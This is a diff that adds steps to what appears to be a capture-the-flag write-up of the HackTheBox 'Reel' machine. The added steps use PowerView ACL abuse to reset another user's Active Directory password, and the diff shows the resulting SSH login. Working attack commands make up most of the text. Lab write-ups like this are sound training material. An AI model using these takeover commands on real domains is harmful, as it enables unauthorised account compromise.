@@ -496,7 +496,24 @@ PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -Rights 'All' -
 ```
 This imported powerview which was conveniently already there for me, then made `tom` the owner of `claire` from there i could give myself full control over `claire`
 
+```python
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force           
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -Identity 'claire' -AccountPassword $NewPassword
+```
+Now i have GenericAll i can just change the password like ive done here
 
+```python
+ssh claire@reel.htb.local                                       
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+claire@reel.htb.local's password: 
+
+Microsoft Windows [Version 6.3.9600]                                                                                            
+(c) 2013 Microsoft Corporation. All rights reserved.                                                                            
+
+claire@REEL C:\Users\claire> 
+```
 
 
 
